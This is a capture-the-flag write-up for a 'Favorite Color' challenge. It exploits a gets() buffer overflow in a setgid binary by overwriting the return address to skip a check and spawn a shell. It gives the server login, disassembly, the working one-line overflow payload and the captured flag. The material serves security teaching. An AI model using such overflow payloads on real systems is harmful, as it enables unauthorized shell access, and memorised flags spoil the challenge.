# Favorite Color
## Description
What's your favorite color? Would you like to share with me? Run the command: `ssh color@104.131.79.111 -p 1001` (pw: guest) to tell me!
## Hints
(None)
## Solution
1. Login to the server and take a look. The file `flag.txt` is of interest, but we can't open it. Inspecting `color.c`, the function `vuln` will be our focus.
```console
color@ubuntu-512mb-nyc3-01:~$ ll
total 40
dr-xr-x---  2 root color     4096 Apr 24  2018 ./
drwxr-xr-x 20 root root      4096 Oct 28  2021 ../
-r--r--r--  1 root root       220 Aug 31  2015 .bash_logout
-r--r--r--  1 root root      3771 Aug 31  2015 .bashrc
-r--r--r--  1 root root         0 Sep  1  2017 .cloud-locale-test.skip
-r-xr-sr-x  1 root color_pwn 7672 Sep 12  2017 color*
-r--r--r--  1 root root       722 Sep 12  2017 color.c
-r--r-----  1 root color_pwn   24 Sep 12  2017 flag.txt
-r--r--r--  1 root root       714 Sep 12  2017 Makefile
-r--r--r--  1 root root       655 May 16  2017 .profile
color@ubuntu-512mb-nyc3-01:~$ ./color
Enter your favorite color: blue
Boo... I hate that color! :(
color@ubuntu-512mb-nyc3-01:~$ cat flag.txt
cat: flag.txt: Permission denied
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];
    
    printf("Enter your favorite color: ");
    gets(buf);
    
    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }
    
    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    
    //disable buffering.
    setbuf(stdout, NULL);
    
    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```
2. We will never return anything but `0` from `vuln`. How do we get around this? A simple buffer overflow exploiting `gets` and replacing the return address with one of our choosing. If we look at `vuln` in GDB, we see that the buffer is `48 (0x30)` bytes. Including the pushed value of EBP, we need to overflow `52` bytes and then insert our return address.
```console
color@ubuntu-512mb-nyc3-01:~$ gdb -q color
Reading symbols from color...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804858b <+0>:   push   ebp
   0x0804858c <+1>:	  mov    ebp,esp
   0x0804858e <+3>:	  sub    esp,0x38
   0x08048591 <+6>:	  sub    esp,0xc
   0x08048594 <+9>:	  push   0x8048730
   0x08048599 <+14>:	call   0x8048410 <printf@plt>
   0x0804859e <+19>:	add    esp,0x10
   0x080485a1 <+22>:	sub    esp,0xc
   0x080485a4 <+25>:	lea    eax,[ebp-0x30]
   0x080485a7 <+28>:	push   eax
   0x080485a8 <+29>:	call   0x8048420 <gets@plt>
   0x080485ad <+34>:	add    esp,0x10
   0x080485b0 <+37>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080485b7 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x080485be <+51>:	jmp    0x80485cb <vuln+64>
   0x080485c0 <+53>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080485c7 <+60>:	add    DWORD PTR [ebp-0x10],0x1
   0x080485cb <+64>:	lea    edx,[ebp-0x30]
   0x080485ce <+67>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080485d1 <+70>:	add    eax,edx
   0x080485d3 <+72>:	movzx  eax,BYTE PTR [eax]
   0x080485d6 <+75>:	test   al,al
   0x080485d8 <+77>:	jne    0x80485c0 <vuln+53>
   0x080485da <+79>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485dd <+82>:	leave  
   0x080485de <+83>:	ret    
End of assembler dump.
```
3. What return address do we target? We need to bypass the `if` statement in `main` that checks the return value of `vuln`. That gives us a return address of `0x08048657`, right after the `je 0x8048689` instruction.
```console
   0x0804864e <+111>:	call   0x804858b <vuln>
   0x08048653 <+116>:	test   eax,eax
   0x08048655 <+118>:	je     0x8048689 <main+170>
   0x08048657 <+120>:	sub    esp,0xc
```
4. Exploit!
```console
color@ubuntu-512mb-nyc3-01:~$ (python -c 'print("a"*52 + "\x57\x86\x04\x08")'; cat) | ./color
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
ls
color  color.c	flag.txt  Makefile
cat flag.txt
flag{c0lor_0f_0verf1ow}
```
